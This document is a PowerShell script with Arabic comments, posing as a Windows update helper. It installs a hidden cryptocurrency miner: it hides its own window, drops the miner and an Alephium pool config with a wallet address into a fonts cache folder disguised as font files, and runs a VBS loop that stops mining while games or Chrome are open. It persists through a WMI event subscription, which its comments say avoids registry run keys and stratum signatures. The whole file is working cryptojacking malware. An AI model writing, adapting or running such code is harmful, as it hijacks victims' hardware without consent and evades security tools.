# === WinUpdateHelper v8.0 - True Ghost Protocol ===
# No Registry Run Keys | No PowerShell Persistence | No Stratum Signature

$ErrorActionPreference = 'SilentlyContinue'

# 1. إخفاء فوري
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int h,int n);' -Name w -Namespace g -PassThru | Out-Null
[g.w]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

# 2. مسار نادر المسح (User Fonts Cache)
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) { New-Item -Path $fontDir -ItemType Directory -Force | Out-Null }
$minerPath = Join-Path $fontDir "msft_font_cache.exe"
$configPath = Join-Path $fontDir "font_cache.dat"
$vbsPath = Join-Path $fontDir "font_loader.vbs"

# 3. كونفيج Alephium (Port 443 TLS)
$configJson = @'
{"pools":[{"url":"stratum+ssl://eu.alephium.herominers.com:2119","user":"3cUq8AZ5hUmpgmdEFMiKgeEqR2PvoEpuHAQ2jXFfYvCf9QLTcQjnG","pass":"x","tls":true}],"algorithm":"blake3","gpu-enable":true,"cpu-enable":false}
'@
[System.IO.File]::WriteAllText($configPath, $configJson)

# 4. محرك تكيفي بـ VBS (لا PowerShell دائم)
$vbsContent = @'
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
miner = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Fonts\msft_font_cache.exe"
cfg = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Fonts\font_cache.dat"

Do
    Set procs = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process WHERE Name='msft_font_cache.exe'")
    idle = True
    For Each p In GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Process")
        If p.CommandLine Like "*game*" Or p.CommandLine Like "*unity*" Or p.CommandLine Like "*chrome*" Then idle = False
    Next
    
    If idle And procs.Count = 0 Then
        shell.Run """" & miner & """ --config """ & cfg & """ --no-cpu", 0, False
    ElseIf Not idle And procs.Count > 0 Then
        For Each p In procs: p.Terminate: Next
    End If
    WScript.Sleep 15000
Loop
'@
[System.IO.File]::WriteAllText($vbsPath, $vbsContent)

# 5. استدامة عبر WMI Event (لا Run Key)
$filterName = "FontCacheMonitor"
$consumerName = "FontCacheLoader"
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

# إنشاء Filter
$wmifilter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = $query
} -ErrorAction Stop

# إنشاء Consumer
$wmiconsumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    ExecutablePath = "wscript.exe"
    CommandLineTemplate = "`"$vbsPath`""
} -ErrorAction Stop

# ربط Filter بـ Consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
    Filter = $wmifilter
    Consumer = $wmiconsumer
} -ErrorAction Stop

# 6. التشغيل الفوري
Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden